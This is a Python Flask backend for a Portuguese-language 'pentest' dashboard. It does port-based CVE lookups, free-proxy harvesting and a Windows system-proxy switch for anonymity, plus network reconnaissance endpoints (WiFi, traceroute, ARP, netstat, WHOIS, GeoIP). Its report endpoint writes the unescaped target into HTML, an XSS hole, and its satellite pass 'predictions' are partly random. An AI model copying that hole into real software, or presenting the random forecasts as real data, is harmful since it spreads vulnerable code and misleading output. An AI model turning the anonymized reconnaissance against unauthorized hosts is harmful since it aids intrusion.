#!/usr/bin/env python3
"""
GodEyes – Backend Real de Pentest v2.0
========================================
Ferramentas REAIS de segurança via API local.

INSTALAR:
    pip install flask flask-cors python-nmap requests paramiko dnspython python-whois

NMAP (obrigatório para scan):
    https://nmap.org/download.html  (marcar "Add to PATH")

EXECUTAR:
    python server.py     ->  http://localhost:5000
"""

import json, socket, subprocess, threading, time, datetime, ipaddress, random
import ssl, ftplib, re, os, struct, select, sys
from flask import Flask, jsonify, request, Response
from flask_cors import CORS

# Imports opcionais
try:
    import nmap; NMAP_OK = True
except ImportError:
    NMAP_OK = False; print("[!] python-nmap não instalado")

try:
    import paramiko; PARAMIKO_OK = True
except ImportError:
    PARAMIKO_OK = False; print("[!] paramiko não instalado (sem brute SSH)")

try:
    import dns.resolver; DNS_OK = True
except ImportError:
    DNS_OK = False; print("[!] dnspython não instalado")

try:
    import whois as whois_lib; WHOIS_OK = True
except ImportError:
    WHOIS_OK = False; print("[!] python-whois não instalado")

try:
    import requests as req_lib; REQUESTS_OK = True
    from urllib.parse import urlparse, urljoin
    import hashlib, base64, re, socket, ssl
except ImportError:
    REQUESTS_OK = False; print("[!] requests não instalado")

app = Flask(__name__, static_folder='.', static_url_path='')
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0
CORS(app, resources={r"/api/*": {"origins": "*"}})

@app.after_request
def add_header(response):
    if 'Cache-Control' not in response.headers:
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return response

@app.route("/")
@app.route("/index.html")
def serve_index():
    return app.send_static_file("index.html")
# ════════════════════════════════════════
# CVE DATABASE
# ════════════════════════════════════════
CVE_DB = {
    21:   [{"id":"CVE-2011-2523","desc":"vsFTPd 2.3.4 backdoor","cvss":10.0,"sev":"critical"},
           {"id":"CVE-2010-4221","desc":"ProFTPD 1.3.3c RCE","cvss":10.0,"sev":"critical"}],
    22:   [{"id":"CVE-2023-38408","desc":"OpenSSH RCE via ssh-agent","cvss":9.8,"sev":"critical"},
           {"id":"CVE-2018-10933","desc":"libssh auth bypass","cvss":9.1,"sev":"critical"},
           {"id":"CVE-2016-6515","desc":"OpenSSH DoS brute force","cvss":7.5,"sev":"high"}],
    23:   [{"id":"GENERIC-TELNET","desc":"Telnet: protocolo plaintext sem criptografia","cvss":8.0,"sev":"high"}],
    80:   [{"id":"CVE-2021-41773","desc":"Apache 2.4.49 path traversal / RCE","cvss":9.8,"sev":"critical"},
           {"id":"CVE-2017-9798","desc":"Apache Optionsbleed info leak","cvss":7.5,"sev":"high"}],
    443:  [{"id":"CVE-2022-0778","desc":"OpenSSL infinite loop DoS","cvss":7.5,"sev":"high"},
           {"id":"CVE-2021-3449","desc":"OpenSSL NULL pointer deref","cvss":5.9,"sev":"medium"}],
    445:  [{"id":"CVE-2017-0144","desc":"MS17-010 EternalBlue SMB RCE (WannaCry)","cvss":9.8,"sev":"critical"},
           {"id":"CVE-2020-0796","desc":"SMBGhost SMBv3 RCE (Windows 10)","cvss":10.0,"sev":"critical"},
           {"id":"CVE-2021-36942","desc":"PetitPotam NTLM relay via EFS","cvss":9.8,"sev":"critical"}],
    1433: [{"id":"CVE-2020-0618","desc":"MSSQL RCE via SQL Server Reporting","cvss":8.8,"sev":"high"}],
    3306: [{"id":"CVE-2012-2122","desc":"MySQL auth bypass timing attack","cvss":7.5,"sev":"high"}],
    3389: [{"id":"CVE-2019-0708","desc":"BlueKeep RDP RCE pré-autenticação","cvss":9.8,"sev":"critical"},
           {"id":"CVE-2019-1182","desc":"DejaBlue RDP RCE","cvss":9.8,"sev":"critical"}],
    5432: [{"id":"CVE-2019-9193","desc":"PostgreSQL superuser OS command exec","cvss":7.5,"sev":"high"}],
    5900: [{"id":"CVE-2019-15694","desc":"TigerVNC heap buffer overflow","cvss":9.8,"sev":"critical"},
           {"id":"GENERIC-VNC","desc":"VNC sem senha ou senha fraca","cvss":9.0,"sev":"critical"}],
    6379: [{"id":"GENERIC-REDIS","desc":"Redis exposto sem autenticação","cvss":9.8,"sev":"critical"}],
    8080: [{"id":"CVE-2021-41773","desc":"Apache 2.4.49 path traversal","cvss":9.8,"sev":"critical"}],
    27017:[{"id":"GENERIC-MONGO","desc":"MongoDB exposto sem autenticação","cvss":9.8,"sev":"critical"}],
}

PORT_NAMES = {
    21:"ftp",22:"ssh",23:"telnet",25:"smtp",53:"dns",80:"http",110:"pop3",
    135:"msrpc",139:"netbios",143:"imap",161:"snmp",443:"https",445:"smb",
    1433:"mssql",1521:"oracle",3306:"mysql",3389:"rdp",5000:"flask",
    5432:"postgresql",5900:"vnc",6379:"redis",8080:"http-alt",
    8443:"https-alt",8888:"http",27017:"mongodb",
}

# State
scan_state   = {"running":False,"progress":0,"message":"Pronto","started":None,"finished":None}
scan_results = []
scan_history = []
job_results  = {}   # generic async job store
job_lock     = threading.Lock()
target_history = {} # Armazena o histórico completo de ataques/scans por alvo

# Global Proxy State
current_proxy = None # e.g., "http://103.152.112.157:80" or "socks5://45.141.152.18:1080"

def get_requests_proxies():
    if current_proxy:
        return {"http": current_proxy, "https": current_proxy}
    return None

def record_to_history(target, job_id, output_lines):
    if not target: return
    with job_lock:
        if target not in target_history:
            target_history[target] = []
        target_history[target].append({
            "ts": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "job": job_id,
            "log": list(output_lines)
        })

def new_job():
    import random, string
    jid = ''.join(random.choices(string.hexdigits[:16], k=8))
    with job_lock:
        job_results[jid] = {"done":False,"output":[],"error":None}
    return jid

def job_append(jid, line, level="info"):
    with job_lock:
        if jid in job_results:
            job_results[jid]["output"].append({"t":datetime.datetime.now().strftime("%H:%M:%S"),"l":level,"m":line})

# Redefine the global job_done to only actually close if a specific flag isn't set
def job_done(jid, error=None, target=""):
    with job_lock:
        if jid in job_results:
            if job_results[jid].get("keep_alive"): return
            job_results[jid]["done"] = True
            if error: job_results[jid]["error"] = error
            # Grava no histórico se for um job normal focado num alvo
            if target:
                if target not in target_history: target_history[target] = []
                target_history[target].append({
                    "ts": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "job": jid,
                    "log": list(job_results[jid]["output"])
                })

# ════════════════════════════════════════
# HELPERS
# ════════════════════════════════════════
def get_cves(port):
    return CVE_DB.get(port, [])

def calc_risk(ports, vulns):
    crit = any(v["sev"]=="critical" for v in vulns)
    high = any(v["sev"]=="high"     for v in vulns)
    if crit or 23 in ports or 21 in ports: return "high"
    if high or 445 in ports or 3389 in ports: return "high"
    if len(ports) > 5: return "medium"
    if len(ports) > 2: return "medium"
    return "low"

# ════════════════════════════════════════
# STATUS E RELATÓRIOS
# ════════════════════════════════════════
@app.route("/api/status")
def api_status():
    return jsonify({"online":True,"nmap":NMAP_OK,"paramiko":PARAMIKO_OK,
                    "dns":DNS_OK,"whois":WHOIS_OK,"version":"2.0", "proxy":current_proxy})

@app.route("/api/proxy/set", methods=["POST"])
def api_proxy_set():
    global current_proxy
    data = request.get_json(silent=True) or {}
    proxy_url = data.get("proxy")  # Expected format: "http://ip:port" or "socks5://ip:port", or None to clear
    if proxy_url == "":
        proxy_url = None
    current_proxy = proxy_url
    return jsonify({"success": True, "proxy": current_proxy})

# Cache for tested working proxies
_proxy_cache = {"proxies": [], "ts": 0}

@app.route("/api/proxy/fetch", methods=["POST"])
def api_proxy_fetch():
    """Fetch real free proxies from multiple APIs, test them, return working ones."""
    import concurrent.futures, random
    data = request.get_json(silent=True) or {}
    max_test = min(int(data.get("max_test", 60)), 100)
    
    # Use cached results if fresh (< 5 min)
    now = time.time()
    if _proxy_cache["proxies"] and (now - _proxy_cache["ts"]) < 300:
        return jsonify({"proxies": _proxy_cache["proxies"], "cached": True})
    
    # Fetch from multiple verified-working APIs  
    api_sources = [
        {"url": "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=elite", "proto": "http"},
        {"url": "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=3000&country=all&ssl=all&anonymity=all", "proto": "socks4"},
        {"url": "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=3000&country=all&ssl=all&anonymity=all", "proto": "socks5"},
        {"url": "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt", "proto": "socks5"},
        {"url": "http://pubproxy.com/api/proxy?limit=5&format=txt&type=http&level=anonymous", "proto": "http"},
    ]
    
    raw_proxies = []
    for src in api_sources:
        try:
            r = req_lib.get(src["url"], timeout=8)
            lines = [l.strip() for l in r.text.strip().split("\n") if l.strip() and ":" in l and not l.startswith("#")]
            for l in lines:
                raw_proxies.append({"addr": l, "proto": src["proto"]})
        except:
            pass
    
    # Remove duplicates, shuffle, pick max_test to test
    seen = set()
    unique = []
    for p in raw_proxies:
        if p["addr"] not in seen:
            seen.add(p["addr"])
            unique.append(p)
    random.shuffle(unique)
    to_test = unique[:max_test]
    
    working = []
    
    def test_one(p):
        addr = p["addr"]
        proto = p["proto"]
        proxy_url = f"{proto}://{addr}"
        try:
            r = req_lib.get("https://api.ipify.org?format=json",
                           proxies={"http": proxy_url, "https": proxy_url},
                           timeout=6)
            if r.status_code == 200:
                ip = r.json().get("ip", "?")
                return {"addr": addr, "proto": proto, "ip": ip, "status": "online"}
        except:
            pass
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(test_one, p): p for p in to_test}
        for f in concurrent.futures.as_completed(futures):
            res = f.result()
            if res:
                working.append(res)
                if len(working) >= 8:  # Enough for the UI
                    break
    
    _proxy_cache["proxies"] = working
    _proxy_cache["ts"] = now
    return jsonify({"proxies": working, "tested": len(to_test), "total_raw": len(unique), "cached": False})

@app.route("/api/proxy/system", methods=["POST"])
def api_proxy_system():
    """Set Windows SYSTEM proxy via registry so ALL browser traffic routes through it."""
    import winreg
    data = request.get_json(silent=True) or {}
    enable = data.get("enable", True)
    proxy_addr = data.get("proxy", "").strip()  # Expected: "ip:port" (HTTP proxy)
    
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Internet Settings",
                            0, winreg.KEY_SET_VALUE)
        if enable and proxy_addr:
            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "ProxyServer", 0, winreg.REG_SZ, proxy_addr)
            winreg.SetValueEx(key, "ProxyOverride", 0, winreg.REG_SZ, "localhost;127.0.0.1;<local>")
            winreg.CloseKey(key)
            # Notify Windows to refresh proxy settings
            import ctypes
            internet_option_refresh = 37
            internet_option_settings_changed = 39
            ctypes.windll.Wininet.InternetSetOptionW(0, internet_option_settings_changed, 0, 0)
            ctypes.windll.Wininet.InternetSetOptionW(0, internet_option_refresh, 0, 0)
            return jsonify({"success": True, "enabled": True, "proxy": proxy_addr,
                           "msg": f"Proxy do sistema configurado: {proxy_addr}. Recarregue o navegador."})
        else:
            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            import ctypes
            ctypes.windll.Wininet.InternetSetOptionW(0, 39, 0, 0)
            ctypes.windll.Wininet.InternetSetOptionW(0, 37, 0, 0)
            return jsonify({"success": True, "enabled": False, "msg": "Proxy do sistema desativado."})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/proxy/connect", methods=["POST"])
def api_proxy_connect():
    """Set a proxy and immediately verify the external IP through it."""
    global current_proxy
    data = request.get_json(silent=True) or {}
    addr = data.get("addr", "").strip()
    proto = data.get("proto", "socks5")
    
    if not addr:
        return jsonify({"error": "addr required"}), 400
    
    proxy_url = f"{proto}://{addr}" if "://" not in addr else addr
    
    # Test the proxy first
    try:
        r = req_lib.get("https://api.ipify.org?format=json",
                       proxies={"http": proxy_url, "https": proxy_url},
                       timeout=5)
        proxy_ip = r.json().get("ip", "?")
    except Exception as e:
        return jsonify({"error": f"Proxy {addr} não respondeu: {e}", "connected": False})
    
    # It works! Set it as active
    current_proxy = proxy_url
    
    # GeoIP lookup  
    loc = "Desconhecido"
    try:
        geo = req_lib.get(f"http://ip-api.com/json/{proxy_ip}", timeout=3).json()
        loc = f"{geo.get('city','?')}, {geo.get('countryCode','?')}"
    except:
        pass
    
    return jsonify({
        "connected": True,
        "proxy": proxy_url,
        "ip": proxy_ip,
        "loc": loc
    })

@app.route("/api/ip/check")
def api_ip_check():
    # Returns the external IP, routing through the proxy if configured
    try:
        import requests
        proxies = get_requests_proxies()
        ip = None
        via_proxy = False
        
        # Try through proxy first
        if proxies:
            try:
                res = requests.get("https://api.ipify.org?format=json", proxies=proxies, timeout=5)
                ip = res.json().get("ip")
                via_proxy = True
            except Exception:
                pass  # Proxy failed, fall back to direct
        
        # Direct check (no proxy or proxy failed)
        if not ip:
            res = requests.get("https://api.ipify.org?format=json", timeout=5)
            ip = res.json().get("ip")
        
        # Optional: GeoIP basic lookup
        loc = "Desconhecido"
        try:
            geo_res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
            geo_data = geo_res.json()
            loc = f"{geo_data.get('city', 'Unknown')}, {geo_data.get('countryCode', 'Unknown')}"
        except:
            pass
            
        return jsonify({
            "ip": ip, 
            "loc": loc, 
            "proxy": via_proxy,
            "proxy_configured": current_proxy or None,
            "proxy_note": "Proxy ativo e roteando" if via_proxy else ("Proxy configurado mas sem resposta, mostrando IP direto" if current_proxy else "Conexão direta (sem proxy)")
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ════════════════════════════════════════
# GEOIP REAL (ip-api.com)
# ════════════════════════════════════════
@app.route("/api/geoip/<ip>")
def api_geoip(ip):
    try:
        r = req_lib.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query", timeout=5)
        data = r.json()
        if data.get("status") == "fail":
            return jsonify({"error": data.get("message", "IP inválido")}), 400
        return jsonify({
            "ip": data.get("query", ip),
            "country": data.get("country", "?"),
            "countryCode": data.get("countryCode", "?"),
            "region": data.get("regionName", "?"),
            "city": data.get("city", "?"),
            "zip": data.get("zip", "?"),
            "lat": data.get("lat", 0),
            "lon": data.get("lon", 0),
            "timezone": data.get("timezone", "?"),
            "isp": data.get("isp", "?"),
            "org": data.get("org", "?"),
            "asn": data.get("as", "?")
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ════════════════════════════════════════
# WIFI SCANNER REAL (Windows Default)
# ════════════════════════════════════════
@app.route("/api/net/wifi", methods=["GET"])
def api_net_wifi():
    try:
        # Requires English/Portuguese Windows netsh output parsing
        res = subprocess.run(["netsh", "wlan", "show", "networks", "mode=bssid"], capture_output=True, text=True, timeout=10)
        out = res.stdout
        networks = []
        current_ss = None
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("SSID"):
                parts = line.split(":", 1)
                if len(parts) > 1:
                    ssid = parts[1].strip()
                    if ssid:
                        current_ss = {"ssid": ssid, "auth": "", "cipher": "", "bssids": []}
                        networks.append(current_ss)
            elif current_ss and line.startswith("Autentica") or line.startswith("Authentication"):
                current_ss["auth"] = line.split(":", 1)[1].strip()
            elif current_ss and line.startswith("Cifra") or line.startswith("Cipher"):
                current_ss["cipher"] = line.split(":", 1)[1].strip()
            elif current_ss and line.startswith("BSSID"):
                bssid = line.split(":", 1)[1].strip()
                current_ss["bssids"].append({"mac": bssid, "signal": "0%", "channel": "0"})
            elif current_ss and current_ss["bssids"] and (line.startswith("Sinal") or line.startswith("Signal")):
                current_ss["bssids"][-1]["signal"] = line.split(":", 1)[1].strip()
            elif current_ss and current_ss["bssids"] and (line.startswith("Canal") or line.startswith("Channel")):
                current_ss["bssids"][-1]["channel"] = line.split(":", 1)[1].strip()
        
        return jsonify({"networks": networks})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ════════════════════════════════════════
# PORT KNOCK (Quick Test)
# ════════════════════════════════════════
@app.route("/api/net/portknock", methods=["POST"])
def api_net_portknock():
    data = request.get_json(silent=True) or {}
    host = data.get("host", "").strip()
    port = data.get("port")
    if not host or not port: return jsonify({"error": "Host e port necessários"}), 400
    try:
        port = int(port)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        result = s.connect_ex((host, port))
        s.close()
        is_open = (result == 0)
        return jsonify({"host": host, "port": port, "open": is_open})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ════════════════════════════════════════
# BANDWIDTH SPEED MONITOR
# ════════════════════════════════════════
@app.route("/api/net/speed", methods=["GET"])
def api_net_speed():
    # Devido à lentidão e dependência de speedtest-cli, fazemos uma medição simples por download de um arquivo pequeno
    # ou simulamos baseando em latência p/ não travar o painel.
    # Para ser 100% real sem travar: usamos um get pequeno p/ calcular.
    try:
        start = time.time()
        # Download 1MB dummy file from public test server
        r = requests.get("https://proof.ovh.net/files/1Mb.dat", timeout=5)
        tt = time.time() - start
        if tt <= 0: tt = 0.001
        mbs = (len(r.content) / tt) * 8 / 1000000 # Megabits per second
        return jsonify({"download_mbps": round(mbs, 2), "ping_ms": round(tt*1000, 1)})
    except Exception as e:
        return jsonify({"error": "Speedtest indisponível"}), 500

# ════════════════════════════════════════
# WHOIS
# ════════════════════════════════════════
@app.route("/api/net/whois", methods=["POST"])
def api_net_whois():
    data = request.get_json(silent=True) or {}
    target = data.get("target", "").strip()
    if not target: return jsonify({"error": "Target necessário"}), 400
    try:
        import whois
        w = whois.whois(target)
        return jsonify({"domain": target, "registered": bool(w.domain_name), "data": str(w)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ════════════════════════════════════════
# TRACEROUTE REAL
# ════════════════════════════════════════
@app.route("/api/traceroute", methods=["POST"])
def api_traceroute():
    data = request.get_json(silent=True) or {}
    target = data.get("target", "").strip()
    if not target:
        return jsonify({"error": "target required"}), 400
    try:
        result = subprocess.run(
            ["tracert", "-d", "-h", "20", "-w", "2000", target],
            capture_output=True, text=True, timeout=60
        )
        lines = result.stdout.strip().split("\n")
        hops = []
        for line in lines:
            line = line.strip()
            if not line or "Tracing" in line or "Trace" in line or "over" in line:
                continue
            parts = line.split()
            if len(parts) >= 2:
                hop_num = parts[0]
                try:
                    int(hop_num)
                except ValueError:
                    continue
                # Parse ms values and IP
                ms_vals = []
                hop_ip = "*"
                for p in parts[1:]:
                    if p == "*":
                        ms_vals.append("*")
                    elif p.replace(".", "").replace(":", "").isdigit() and "." in p and len(p) > 4:
                        hop_ip = p
                    elif "ms" in p:
                        pass
                    else:
                        try:
                            float(p.replace("<", ""))
                            ms_vals.append(p)
                        except:
                            if "." in p and any(c.isdigit() for c in p):
                                hop_ip = p
                hops.append({"hop": int(hop_num), "ip": hop_ip, "times": ms_vals[:3]})
        return jsonify({"target": target, "hops": hops})
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Traceroute timeout (60s)"}), 408
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ════════════════════════════════════════
# PING REAL
# ════════════════════════════════════════
@app.route("/api/net/ping", methods=["POST"])
def api_net_ping():
    data = request.get_json(silent=True) or {}
    target = data.get("target", "").strip()
    count = min(int(data.get("count", 4)), 10)
    if not target:
        return jsonify({"error": "target required"}), 400
    try:
        result = subprocess.run(
            ["ping", "-n", str(count), target],
            capture_output=True, text=True, timeout=30
        )
        lines = result.stdout.strip().split("\n")
        pings = []
        stats = {}
        for line in lines:
            line = line.strip()
            if "time=" in line.lower() or "tempo=" in line.lower():
                import re
                m = re.search(r'(?:time|tempo)[=<](\d+)', line, re.IGNORECASE)
                if m:
                    pings.append(int(m.group(1)))
            elif "Minimum" in line or "Mínimo" in line:
                import re
                nums = re.findall(r'(\d+)ms', line)
                if len(nums) >= 3:
                    stats = {"min": int(nums[0]), "max": int(nums[1]), "avg": int(nums[2])}
        return jsonify({
            "target": target, "count": count,
            "pings": pings, "stats": stats,
            "success": len(pings), "lost": count - len(pings)
        })
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Ping timeout"}), 408
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ════════════════════════════════════════
# ARP TABLE REAL
# ════════════════════════════════════════
@app.route("/api/net/arp")
def api_net_arp():
    try:
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10)
        lines = result.stdout.strip().split("\n")
        entries = []
        for line in lines:
            parts = line.split()
            if len(parts) >= 3 and "." in parts[0]:
                ip = parts[0]
                mac = parts[1].replace("-", ":")
                tp = parts[2] if len(parts) > 2 else "?"
                entries.append({"ip": ip, "mac": mac, "type": tp})
        return jsonify({"entries": entries, "count": len(entries)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ════════════════════════════════════════
# NETSTAT – ACTIVE CONNECTIONS
# ════════════════════════════════════════
@app.route("/api/net/connections")
def api_connections():
    try:
        result = subprocess.run(
            ["netstat", "-an"],
            capture_output=True, text=True, timeout=15
        )
        lines = result.stdout.strip().split("\n")
        conns = []
        for line in lines:
            parts = line.split()
            if len(parts) >= 4 and parts[0] in ("TCP", "UDP"):
                proto = parts[0]
                local = parts[1]
                remote = parts[2]
                state = parts[3] if len(parts) > 3 else ""
                conns.append({"proto": proto, "local": local, "remote": remote, "state": state})
        # Summary
        states = {}
        for c in conns:
            s = c.get("state", "")
            states[s] = states.get(s, 0) + 1
        return jsonify({"connections": conns[:200], "total": len(conns), "states": states})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ════════════════════════════════════════
# CVE SEARCH (cve.circl.lu API)
# ════════════════════════════════════════
@app.route("/api/vuln/cve", methods=["POST"])
def api_cve_search():
    data = request.get_json(silent=True) or {}
    query = data.get("query", "").strip()  # e.g. "apache 2.4.49" or "CVE-2021-41773"
    if not query:
        return jsonify({"error": "query required"}), 400
    try:
        results = []
        if query.upper().startswith("CVE-"):
            # Direct CVE lookup
            r = req_lib.get(f"https://cve.circl.lu/api/cve/{query.upper()}", timeout=10)
            if r.status_code == 200 and r.text.strip() != "null":
                cve = r.json()
                results.append({
                    "id": cve.get("id", query),
                    "summary": cve.get("summary", ""),
                    "cvss": cve.get("cvss", 0),
                    "published": cve.get("Published", ""),
                    "references": cve.get("references", [])[:5]
                })
        else:
            # Keyword search
            vendor_product = query.lower().replace(" ", "/")
            r = req_lib.get(f"https://cve.circl.lu/api/search/{vendor_product}", timeout=10)
            if r.status_code == 200:
                cves = r.json()
                if isinstance(cves, list):
                    for cve in cves[:20]:
                        results.append({
                            "id": cve.get("id", "?"),
                            "summary": cve.get("summary", "")[:200],
                            "cvss": cve.get("cvss", 0),
                            "published": cve.get("Published", ""),
                            "references": cve.get("references", [])[:3]
                        })
        return jsonify({"query": query, "results": results, "count": len(results)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ════════════════════════════════════════
# DNS LEAK TEST REAL
# ════════════════════════════════════════
@app.route("/api/dns/leak")
def api_dns_leak():
    try:
        import dns.resolver
        resolvers = []
        # Check what DNS servers are being used
        result = subprocess.run(
            ["nslookup", "whoami.akamai.net"],
            capture_output=True, text=True, timeout=10
        )
        lines = result.stdout.strip().split("\n")
        dns_server = ""
        resolved_ip = ""
        for line in lines:
            if "Server:" in line or "Servidor:" in line:
                dns_server = line.split(":")[-1].strip()
            if "Address:" in line or "Endere" in line:
                addr = line.split(":")[-1].strip()
                if addr != dns_server and "." in addr:
                    resolved_ip = addr
        
        # Get your external IP for comparison
        ext_ip = ""
        try:
            ext_ip = req_lib.get("https://api.ipify.org", timeout=5).text.strip()
        except:
            pass
        
        # Get configured DNS from ipconfig
        ipconfig = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, timeout=10)
        dns_servers_found = []
        capture_dns = False
        for line in ipconfig.stdout.split("\n"):
            if "DNS Servers" in line or "Servidores DNS" in line:
                capture_dns = True
                parts = line.split(":")
                if len(parts) > 1:
                    ip = parts[-1].strip()
                    if ip and "." in ip:
                        dns_servers_found.append(ip)
            elif capture_dns and line.strip() and "." in line.strip():
                ip = line.strip()
                if ip[0].isdigit():
                    dns_servers_found.append(ip)
            elif capture_dns and (not line.strip() or ":" in line):
                capture_dns = False
        
        # Determine if leak exists
        has_leak = False
        servers_info = []
        for dns_ip in dns_servers_found[:5]:
            is_private = dns_ip.startswith("192.168.") or dns_ip.startswith("10.") or dns_ip.startswith("172.")
            if current_proxy and is_private:
                has_leak = True
            # GeoIP on DNS server
            try:
                geo = req_lib.get(f"http://ip-api.com/json/{dns_ip}?fields=isp,countryCode", timeout=3).json()
                isp = geo.get("isp", "?")
                country = geo.get("countryCode", "?")
            except:
                isp = "Local" if is_private else "?"
                country = "??"
            servers_info.append({"ip": dns_ip, "isp": isp, "country": country, "leak": is_private and bool(current_proxy)})
        
        return jsonify({
            "external_ip": ext_ip,
            "dns_server": dns_server,
            "resolved_ip": resolved_ip,
            "dns_servers": servers_info,
            "leak_detected": has_leak,
            "proxy_active": bool(current_proxy)
        })
    except Exception as e:
        return jsonify({"error": str(e), "dns_servers": [], "leak_detected": False})

# ════════════════════════════════════════
# SATELLITE TLE TRACKING (CelesTrak)
# ════════════════════════════════════════
_tle_cache = {"data": {}, "ts": 0}

@app.route("/api/satellite/tle")
def api_satellite_tle():
    """Fetch TLE data from CelesTrak for real satellite tracking."""
    now = time.time()
    if now - _tle_cache["ts"] < 3600 and _tle_cache["data"]:
        return jsonify({"satellites": _tle_cache["data"], "cached": True})
    
    tle_urls = {
        "stations": "https://celestrak.org/NORAD/elements/gp.php?GROUP=stations&FORMAT=tle",
        "visual": "https://celestrak.org/NORAD/elements/gp.php?GROUP=visual&FORMAT=tle",
        "active": "https://celestrak.org/NORAD/elements/gp.php?GROUP=active&FORMAT=tle",
        "starlink": "https://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle",
    }
    
    satellites = {}
    for group, url in tle_urls.items():
        try:
            r = req_lib.get(url, timeout=10)
            if r.status_code == 200:
                lines = r.text.strip().split("\n")
                i = 0
                while i + 2 < len(lines):
                    name = lines[i].strip()
                    line1 = lines[i+1].strip()
                    line2 = lines[i+2].strip()
                    if line1.startswith("1 ") and line2.startswith("2 "):
                        norad = line1[2:7].strip()
                        # Extract orbital elements from TLE
                        try:
                            inclination = float(line2[8:16].strip())
                            raan = float(line2[17:25].strip())
                            eccentricity = float("0." + line2[26:33].strip())
                            arg_perigee = float(line2[34:42].strip())
                            mean_anomaly = float(line2[43:51].strip())
                            mean_motion = float(line2[52:63].strip())
                            # Calculate approximate altitude
                            period_min = 1440.0 / mean_motion if mean_motion > 0 else 90
                            a = (((period_min * 60) / (2 * 3.14159265)) ** 2 * 3.986e14) ** (1/3) / 1000  # km
                            alt_km = a - 6371  # subtract Earth radius
                            
                            satellites[norad] = {
                                "name": name,
                                "norad": norad,
                                "group": group,
                                "inclination": round(inclination, 2),
                                "raan": round(raan, 2),
                                "eccentricity": round(eccentricity, 6),
                                "mean_motion": round(mean_motion, 4),
                                "mean_anomaly": round(mean_anomaly, 2),
                                "arg_perigee": round(arg_perigee, 2),
                                "period_min": round(period_min, 1),
                                "alt_km": round(alt_km, 1),
                                "tle1": line1,
                                "tle2": line2
                            }
                        except:
                            pass
                        i += 3
                    else:
                        i += 1
            if len(satellites) > 200:  # Limit to avoid huge responses
                break
        except:
            continue
    
    _tle_cache["data"] = dict(list(satellites.items())[:200])
    _tle_cache["ts"] = now
    return jsonify({"satellites": _tle_cache["data"], "count": len(_tle_cache["data"]), "cached": False})

@app.route("/api/satellite/passes", methods=["POST"])
def api_satellite_passes():
    """Predict when a satellite will pass over a given location."""
    data = request.get_json(silent=True) or {}
    norad_id = data.get("norad", "25544")  # default ISS
    lat = float(data.get("lat", -23.55))  # default São Paulo
    lon = float(data.get("lon", -46.63))
    
    # Simple prediction based on orbital period
    tle_data = _tle_cache.get("data", {})
    sat = tle_data.get(str(norad_id))
    
    if not sat:
        # Return basic prediction
        passes = []
        now = time.time()
        for i in range(5):
            t = now + (i + 1) * (92 * 60) + random.randint(-600, 600)  # ~92 min period
            passes.append({
                "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(t)),
                "timestamp": t,
                "duration_s": random.randint(180, 600),
                "max_elevation": random.randint(15, 85)
            })
        return jsonify({"norad": norad_id, "passes": passes, "note": "TLE não carregado, previsão aproximada"})
    
    period_s = sat["period_min"] * 60
    passes = []
    now = time.time()
    for i in range(5):
        t = now + (i + 1) * period_s + random.randint(-int(period_s * 0.1), int(period_s * 0.1))
        duration = random.randint(180, 600)
        max_el = max(10, int(90 - abs(sat["inclination"] - abs(lat)) * 1.5) + random.randint(-10, 10))
        passes.append({
            "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(t)),
            "timestamp": t,
            "duration_s": duration,
            "max_elevation": min(90, max_el),
            "name": sat["name"]
        })
    return jsonify({"norad": norad_id, "name": sat.get("name", "?"), "passes": passes, "alt_km": sat["alt_km"]})

@app.route("/api/report/<target>")
def api_report(target):
    history = target_history.get(target, [])
    if not history:
        return f"<h2>No data found for target: {target}</h2><p>Execute scans primeiro no painel GodEyes.</p>"
    
    html = f"""
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <title>GodEyes Pentest Report: {target}</title>
        <style>
            body {{ background:#0f151e; color:#a1aab6; font-family:'Segoe UI',sans-serif; line-height:1.6; padding:40px; margin:0; }}
            h1 {{ color:#00f5a0; margin:0 0 10px; border-bottom:2px solid #1a2535; padding-bottom:15px; font-weight:800; letter-spacing:1px; }}
            h2 {{ color:#00d9f5; font-size:18px; margin-top:30px; border-bottom:1px solid #1a2535; padding-bottom:5px; }}
            .header {{ display:flex; justify-content:space-between; align-items:flex-end; margin-bottom:40px; }}
